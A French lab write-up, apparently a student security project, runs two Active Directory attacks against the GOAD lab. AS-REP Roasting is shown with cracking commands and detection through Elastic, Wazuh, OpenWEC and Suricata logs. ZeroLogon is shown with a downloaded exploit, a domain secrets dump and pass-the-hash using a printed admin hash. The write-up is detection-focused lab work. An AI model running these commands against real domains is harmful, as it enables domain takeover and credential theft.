# **4 Attaques Documentées sur GOAD**

---

## **Préambule**

Ce document détaille **4 attaques réalistes et documentées** qui fonctionnent sur GOAD. Pour chacune, nous aurons :
- ✅ **Procédure complète** (étape par étape)
- ✅ **Logs Elastic** (filtres KQL)
- ✅ **Logs Wazuh** (rule IDs + requêtes)
- ✅ **Logs OpenWEC** (Event IDs Windows)

**Durée par attaque:** ~1h-1h15 (incluant la détection)

---

## 🗺️ **Topologie GOAD (Rappel)**

```
SEVENKINGDOMS.LOCAL (Root)
├── NORTH.SEVENKINGDOMS.LOCAL
│   └── DC: WINTERFELL (10.203.19.65)
│       └── Users: jon.snow, robb.stark, brandon.stark...
│
├── SOUTH.SEVENKINGDOMS.LOCAL
│   └── DC: KINGSLANDING (10.203.19.64)
│       └── Users: tyron.lannister, cersei.lannister...
│       └── MSSQL: SQL Server
│
└── ESSOS.LOCAL (Forest trust)
    └── DC: BRAAVOS (10.203.19.63)
        └── Users: khal.drogo, missandei...
        └── ADCS: Certificate Authority
```

---

---

# 🔴 **ATTAQUE 1: AS-REP Roasting (Kerberos Pre-Auth Disabled)**

## 📋 **Contexte & Objectif**

**Vulnérabilité:** L'utilisateur `missandei@essos.local` a Kerberos pré-authentification **désactivée**.  
**Impact:** Sans pré-auth, n'importe qui peut demander un TGT sans mot de passe valide.  
**Résultat:** On peut récupérer un ticket chiffré avec le hash de l'utilisateur et le craquer hors ligne.

**MITRE ATT&CK:** [T1558.004](https://attack.mitre.org/techniques/T1558/004/) - Kerberos Ticket without Pre-authentication

---

## 🚀 **Procédure d'Attaque**

### **Étape 1: Énumération initiale (depuis Exegol)**

```bash
# Rentrer dans Exegol
docker exec -it exegol-pentest bash

# On installe impacket
pip install impacket
```
![](https://hedgedoc.botturi.fr/uploads/b2368768-762e-4b6e-8cd3-ae9235e63630.png)

```bash
# On a besoin d'une liste d'utilisateurs du domaine ESSOS
# On va la créer : 
cat > /workspace/essos_users.txt << EOF
missandei
khal.drogo
daenerys.targaryen
viserys.targaryen
jorah.mormont
barristan.selmy
grey.worm
varys
illyrio
kraznys
EOF
```
![](https://hedgedoc.botturi.fr/uploads/5b763cbd-d0a0-4512-addc-94bd791c7cf6.png)

Ensuite on teste une attaque avec nos users : 
```bash=
GetNPUsers.py -dc-ip 10.203.19.63 'essos.local/' -usersfile /workspace/essos_users.txt -no-pass -format hashcat -outputfile asrep_hashes.txt 2>&1 | tee asrep_enum.log
```
![](https://hedgedoc.botturi.fr/uploads/a6ac9f15-7142-47f8-907c-fa210289cf1d.png)
On voit bien que misandei est vulnérable et on obtient un ticket TGT Kerberos. 

Ensuite, on aurait aussi pu le cibler directement : 
```bash=
GetNPUsers.py -dc-ip 10.203.19.63 'essos.local/missandei' -no-pass -format hashcat -outputfile asrep_hashes.txt
```
![](https://hedgedoc.botturi.fr/uploads/6d01e4e5-1d73-4c9a-b2b9-b1a3f5e4ce4f.png)

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for missandei
$krb5asrep$23$missandei@ESSOS.LOCAL:ab24f31b0d3817df80c40a71fbef80aa$bf8fb00bca62625869319e16e578763d2deacf61eb49f8637316b9e0bf4d31c64c680a7fafd56dcfa2bf0ab449832d43b34c59bbf9e438a510d19a6bac6475eead54d0abe5b7155013c7f6cda0a08a7f97ecc59d3a9c26bfee9f1acf5ffec7445cd30536f70321c490ff73486b4546939b735512b1c3e8aa856909c4ecc9fc06aed6a51b342940c09387c97137c65ef6fe58256a357ec620cd75259d70dbd1a594f23aeec1afd47c000b29bf375e3b350864584bc947abbb969859abcdd5a225d6acc6f643b32cf69592f9a73905e8780c5437f769ac19c179755ca2ff79e226b33c2b8c0c1e3bf9bc25
```

### **Étape 2: Cracker le hash hors ligne**

On commence par récupérer `rockyou.txt` : 
```bash=
wget https://weakpass.com/download/90/rockyou.txt.gz
gunzip rockyou.txt.gz
mkdir -p /opt/resources/wordlists/
mv rockyou.txt /opt/resources/wordlists/
```
Et on crack soit avec hashcat soit avec John : 
```bash
# Avec Hashcat
# Ou avec John the Ripper dans Exegol
hashcat -m 18200 asrep_hashes.txt /opt/resources/wordlists/rockyou.txt --quiet

# Ou avec John
john --format=krb5asrep --wordlist=/opt/resources/wordlists/rockyou.txt asrep_hashes.txt
```

**Résultat attendu:**
```
$krb5asrep$23$missandei@ESSOS.LOCAL:...:fr3edom
```
![](https://hedgedoc.botturi.fr/uploads/4fdee4b0-b851-435d-846f-489fb97c92b5.png)

Ainsi le mot de passe est `fr3edom`

### **Étape 3: Valider les credentials**

```bash
# Vérifier qu'on peut se connecter avec missandei:fr3edom ; pas d'erreurs si les credentials sont valides
GetUserSPNs.py -dc-ip 10.203.19.63 'ESSOS.LOCAL/missandei:fr3edom'

# De même avec smbclient
smbclient.py 'essos.local/missandei:fr3edom@10.203.19.63'

# Ou via CrackMapExec (depuis Exegol)
pip install git+https://github.com/Pennyw0rth/NetExec
nxc smb 10.203.19.63 -u missandei -p fr3edom -d essos.local
```

**Résultat attendu:**
```
# Pour GetUserSNPs.py : Pas d'erreur sur les credentials et une liste : 
Impacket v0.14.0.dev0+20260126.101237.a813ebe7 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName               Name         MemberOf                                                 PasswordLastSet             LastLogon                   Delegation
---------------------------------  -----------  -------------------------------------------------------  --------------------------  --------------------------  -------------
MSSQLSvc/braavos.essos.local       sql_svc                                                               2026-01-19 18:38:17.339126  2026-01-23 16:34:18.097131
MSSQLSvc/braavos.essos.local:1433  sql_svc                                                               2026-01-19 18:38:17.339126  2026-01-23 16:34:18.097131
http/openwec.essos.local           openwec_svc  CN=Remote Management Users,CN=Builtin,DC=essos,DC=local  2026-01-22 11:45:50.332564  2026-01-22 13:48:23.011397  unconstrained



# Pour smbclient -> Pas d'erreur :
Impacket v0.14.0.dev0+20260126.101237.a813ebe7 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# exit

# Pour NetExec
SMB         10.203.19.63    445    MEEREEN          [+] essos.local\missandei:fr3edom
```
![](https://hedgedoc.botturi.fr/uploads/d387f6f0-521a-4cec-8e1e-5b76b1dfa078.png)
![](https://hedgedoc.botturi.fr/uploads/2c49c81f-c5a7-4ef2-8e53-0af8ab62d3f9.png)

Le credential est donc bon

---

## 📊 **Logs obtenus**

### **🔍 Elastic Search (ELK Stack)**

**KQL - Event ID 4768 (TGT Request)**

```
host.os.type: "windows" and winlog.event_id: 4768 and winlog.event_data.PreAuthType: 0
```
Ce flag :   "winlog.event_data.PreAuthType": 0, indique bien une attaque car aucun compte ne devrait pouvoir faire quelque chose avant de s'être identifié -

On trouve ainsi ces logs (on se concentre sur ces trois là, les autres venant d'une attaque précédente) : 

![](https://hedgedoc.botturi.fr/uploads/d6b215ea-2543-4c13-996f-2573dddc4d05.png)

Ainsi, nous pouvons obtenirs via les logs JSON détaillés de chaques évènements ces informations (voir sur le github :
- https://github.com/Radiant-Maxine/SAE_5C03_Nixie/blob/main/LOGS/exports/Attaque_1_Elastic_Log_1.json
- https://github.com/Radiant-Maxine/SAE_5C03_Nixie/blob/main/LOGS/exports/Attaque_1_Elastic_Log_2.json
- https://github.com/Radiant-Maxine/SAE_5C03_Nixie/blob/main/LOGS/exports/Attaque_1_Elastic_Log_3.json
) : 
## 🔍 **Événement #1 - 15:59:35.256Z**

### **Métadonnées Critiques**

```json
{
  "@timestamp": "2026-01-28T15:59:35.256Z",        // ← Quand l'attaque a eu lieu
  "event.created": "2026-01-28T15:59:36.650Z",    // ← Quand Windows a loggé l'événement
  "event.ingested": "2026-01-28T15:59:46.000Z",   // ← Quand Elastic l'a indexé (10 sec delay)
  
  "winlog.event_id": 4768,                         // ← Event ID: TGT Request
  "event.code": "4768",
  "event.action": "kerberos-authentication-ticket-requested"
}
```

**→ Interprétation:** L'attaque s'est déroulée à 15:59:35, Windows l'a loggé 1 seconde après, et Elastic l'a vu 10 secondes après.

---

### **Cible de l'Attaque**

```json
{
  "winlog.event_data.TargetUserName": "missandei",  // ← LA VICTIME
  "user.name": "missandei",
  "user.id": "S-1-5-21-2640866812-885156548-4246832817-1117",  // ← SID unique
  "user.domain": "ESSOS.LOCAL",
  "winlog.event_data.TargetDomainName": "ESSOS.LOCAL",
  "winlog.event_data.TargetSid": "S-1-5-21-2640866812-885156548-4246832817-1117"
}
```

**→ Interprétation:** L'attaquant a ciblé le compte `missandei` dans le domaine `ESSOS.LOCAL`. Ce compte possède un SID spécifique qui l'identifie de façon unique.

---

### **Vulnérabilité - PreAuthType = 0**

```json
{
  "winlog.event_data.PreAuthType": 0,  // ← C'EST LA VULNÉRABILITÉ !
  
  // Explications :
  // PreAuthType = 0 signifie:
  //   - Pas de pré-authentification requise
  //   - N'importe qui peut demander un TGT sans mot de passe
  //   - Le TGT sera chiffré avec le hash du compte missandei
  //   - On peut le craquer hors ligne (c'est ce qu'on a fait: password = fr3edom)
}
```

**→ Interprétation:** Sans pré-auth, le KDC (Key Distribution Center) du DC accepte de donner un TGT sans vérifier l'identité. C'est la faille AS-REP Roasting.

---

### **Chiffrement Faible - RC4**

```json
{
  "winlog.event_data.TicketEncryptionType": "0x17",           // ← Code hex
  "winlog.event_data.TicketEncryptionTypeDescription": "RC4-HMAC"  // ← Description lisible
  
  // 0x17 = RC4-HMAC (ancien, faible)
  // Si c'était 0x12 = AES256 (moderne, fort)
  // Si c'était 0x11 = AES128 (moderne, fort)
}
```

**→ Interprétation:** Le TGT est chiffré en RC4 qui est FAIBLE et facile à cracker. Avec AES256, c'aurait été bien plus sûr.


---

### **🌐 Localisation Réseau**

```json
{
  "source.ip": "10.203.19.254",      // ← D'où vient l'attaque
  "source.port": 28565,               // ← Port source (aléatoire côté client)
  
  "host.ip": [
    "fe80::f903:b1a2:f88b:37e8",     // IPv6
    "10.203.19.63",                   // ← Le DC BRAAVOS attaqué
    "fe80::b8c6:283b:145d:b457",     // IPv6
    "192.168.56.12",                  // Interface VirtualBox
    "fe80::5efe:c0a8:380c",          // IPv6
    "fe80::5efe:acb:133f"            // IPv6
  ],
  
  "host.hostname": "meereen",         // ← Nom du DC (Game of Thrones naming!)
  "host.name": "meereen",
  "host.os.name": "Windows Server 2016 Standard Evaluation"
}
```

**→ Interprétation:** 
- **Attaquant:** 10.203.19.254 = Exegol, NAT par le routeur SURICATA
- **Victime:** 10.203.19.63 = DC BRAAVOS (meereen)
- Port 28565 = port source normal (allocué dynamiquement)


---

### **Résultat: Succès de l'Attaque**

```json
{
  "winlog.event_data.Status": "0x0",                  // ← Code hex
  "winlog.event_data.StatusDescription": "KDC_ERR_NONE",  // ← Traduction
  "event.outcome": "success",
  
  // 0x0 = KDC_ERR_NONE = PAS D'ERREUR
  // Le KDC a DONNÉ le TGT sans problème
  // L'attaquant a maintenant le ticket chiffré à craquer
}
```

**→ Interprétation:** Le serveur Kerberos (KDC) a accepté la demande et a retourné un TGT. Cela signifie que l'attaquant a obtenu le ticket à craquer.

## 🔍 **Événement #2 - 15:59:47.097Z (+12 secondes)**

### **Différences clés par rapport à l'événement #1**

```json
{
  "@timestamp": "2026-01-28T15:59:47.097Z",  // ← 12 secondes après le premier
  "source.port": 28581,                       // ← Port source DIFFÉRENT
  "event.created": "2026-01-28T15:59:48.729Z",
  "event.ingested": "2026-01-28T15:59:58.000Z"
}
```

**→ Interprétation:** 
- Même attaque, deuxième tentative
- Port source différent (28581) = nouvelle connexion TCP
- Même timing (créé en ~1 sec, ingéré en ~10 sec)
- **TOUS les autres champs sont identiques** (missandei, ESSOS.LOCAL, PreAuthType=0, RC4, etc.)

**Pourquoi 2 tentatives?**
- GetNPUsers.py a envoyé 2 requêtes AS-REQ successives pour s'assurer d'obtenir le ticket
- C'est un comportement normal des exploits d'énumération

## 🔍 **Événement #3 - 15:59:47.106Z (+12 sec, +9 ms)**

### **Quasi-identique à l'événement #2**

```json
{
  "@timestamp": "2026-01-28T15:59:47.106Z",  // ← +9 millisecondes après l'event #2
  "source.port": 28582,                       // ← Troisième port source différent
  "event.created": "2026-01-28T15:59:48.729Z",  // ← Même timestamp que event #2 !
}
```

**→ Interprétation:** 
- Troisième tentative quasi simultanée (9 ms d'écart)
- Port 28582 = troisième connexion
- Windows a loggé les deux à la même seconde (résolution de 1 sec)
- Même profil: missandei, ESSOS.LOCAL, PreAuthType=0, RC4, Status=0x0

**Pourquoi 3 tentatives?**
- Impacket (utilisé par GetNPUsers.py) retry automatiquement en cas de perte de paquet
- Ou validation de la réponse avec plusieurs requêtes

Ainsi on voit bien les différentes demandes de ticket anonymes pour le serveur Kerberos. Avec des informations réseau, on peut identifier facilement la machine attaquante.

---

### **🚨 Wazuh Agent**

Wazuh, par défaut, ne remonte pas les évènements 4768 (quand on recherche depuis Discover) : 
![](https://hedgedoc.botturi.fr/uploads/a5ba9958-4a93-4de8-bfe0-ad234687c510.png)

Cependant, il existe une rule ID interne correspondant à cet event ID (requête d'un Ticket TGT Kerberos anonyme) : la rule 92652. Ainsi, si on se rends dans **Threat Intelligence** > **Threat Hunting** : 

![](https://hedgedoc.botturi.fr/uploads/a2353090-9d66-4e47-98c5-936648a7c111.png)

Ainsi on voit aussi bien ces alertes. Si on zoom plus, on voit le message complet : 
![](https://hedgedoc.botturi.fr/uploads/1e94d81a-10c2-4100-83a2-03871f527536.png)

Ainsi, on peut mettre une timeline en place plus facilement (plus lisible rapidement) mais d'une manière moins précise qu'avec les logs trés détaillés d'Elastic.

---

### **🔐 OpenWEC (Windows Event Collection)**
Pour Openwec, nous regardons dans notre fichier `sysmon_events.json` pour voir les évènements de type Secutiry avec la commande `grep -a "\"EventID\":4768" sysmon_events.json`. On obtient ce résultat : https://github.com/Radiant-Maxine/SAE_5C03_Nixie/blob/main/LOGS/exports/Attaque_1_Openwec_Log_1.json

Ainsi, si on analyse une trame comme celle là (Événement n°1 (08:36:44)) : 
```json
{
  "System": {
    "EventID": 4768,
    "TimeCreated": "2026-01-29T08:36:44.682477800Z",
    "Channel": "Security",
    "Computer": "meereen.essos.local"
  },
  "EventData": {
    "TargetUserName": "missandei",
    "ServiceName": "krbtgt",
    "IpAddress": "::ffff:10.203.19.254",
    "Status": "0x0"
  }
}
```

On peut noter ces informations : 

    EventID : 4768

    Cible (TargetUserName) : missandei

    Domaine : ESSOS.LOCAL

    Source (IpAddress) : 10.203.19.254 (notée ::ffff:10.203.19.254)

    Résultat (Status) : 0x0 (Succès)

On voit aussi les trames via notre Dashboard Streamlit : 
![](https://hedgedoc.botturi.fr/uploads/06558fa2-137e-4117-8c79-4c56d0d2416f.png)


### **🦦 Suricata**

Pour voir rapidement si Suricata récupère ces évènements, nous allons filtré les évènements krb5 (Kerberos) récoltés avec cette commande : 
```bash=
# Avec grep pour filtrer AVANT jq (plus robuste)
grep '"event_type":"krb5"' /var/log/suricata/eve.json | jq -c '.
```
On obtient ainsi ces résultats https://github.com/Radiant-Maxine/SAE_5C03_Nixie/blob/main/LOGS/exports/Attaque_1_Suricata_eve.json_filtr%C3%A9.json 
On peut en extraire ces trois logs : 
```json
{"msg_type":"KRB_AS_REP","cname":"missandei","encryption":"rc4-hmac","weak_encryption":true}
{"msg_type":"KRB_ERROR","failed_request":"KRB_AS_REQ","error_code":"KDC_ERR_PREAUTH_REQUIRED"}
{"msg_type":"KRB_ERROR","failed_request":"KRB_AS_REQ","error_code":"KDC_ERR_C_PRINCIPAL_UNKNOWN"}
```

Ainsi, avec Suricata, on peut directement faire une chronologie de l'évènement : 
En mettant ces logs bout à bout, voici ce qui s'est passé :

1. **L'attaquant teste des noms d'utilisateurs.**
   * *Log 3 :* Il essaie des noms au hasard. Le DC répond "Inconnu".
2. **L'attaquant trouve des utilisateurs valides.**
   * *Log 2 :* Il trouve un utilisateur valide. Le DC répond "Authentifie-toi d'abord" (Sécurisé).
3. **L'attaquant trouve `missandei`.**
   * *Log 1 :* Il demande un ticket pour `missandei`. Le DC, voyant que la pré-auth est désactivée, envoie directement le ticket chiffré en RC4. **L'attaque a réussi.**

---

---
# 🔴 ATTAQUE 2 – Attaque utilisant ZeroLogon sr le serveur Mereen

En tout premier, on vérifie que la cible est vulnérable à l'attaque. Pour cela on fais la commande : 
```bash=
nxc smb 10.203.19.63 -u '' -p '' -M zerologon
```
On obtient ces résultats : https://github.com/Radiant-Maxine/SAE_5C03_Nixie/blob/main/LOGS/exports/Attaque_2_V%C3%A9rficiation_ZeroLogon 
![](https://hedgedoc.botturi.fr/uploads/37ca91e7-d243-4631-bbd4-6acf2e79cfcc.png)

Ainsi, le serveur est vulnérable. Maintenant on va télécharer et lancer l'exploit : 
```bash=
# 1. Télécharger le script d'exploit officiel
cd /tmp/
wget https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/cve-2020-1472-exploit.py
```
![](https://hedgedoc.botturi.fr/uploads/3fa655b7-028b-48ce-b361-360803f42013.png)

Puis on va l'exécuter : 
```bash=
# 2. Exécuter l'attaque
# Syntaxe : python3 script.py <NOM_NETBIOS_DC> <IP_DC>
python3 cve-2020-1472-exploit.py MEEREEN 10.203.19.63
```
Le résultat : 
```bash=
Performing authentication attempts...
=========================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```
Nous indique que l'attaque a été un succès : 
![](https://hedgedoc.botturi.fr/uploads/e895cb3e-d751-4e23-b0ac-93756cc6d82c.png)
(Result: 0 signifie Succès sans erreurs)

Maintenant on va pouvoir récupérer les logs du domaine avec : 
```bash=
secretsdump.py -just-dc -no-pass 'ESSOS/MEEREEN$@10.203.19.63'
```

On obtient ces dumps : https://github.com/Radiant-Maxine/SAE_5C03_Nixie/blob/main/LOGS/exports/Attaque_2_Dump_Password

On peut vérifier que les hash sont bons en se connectant en SMB par exemple sur le serveur en utilisant le HASH de l'Admin récupéré : 
```bash=
wmiexec.py -hashes :54296a48cd30259cc88095373cec24da Administrator@10.203.19.63
```
![](https://hedgedoc.botturi.fr/uploads/e972f7af-120f-469c-9ddc-e7acf82551bb.png)
Et on est bon ! 
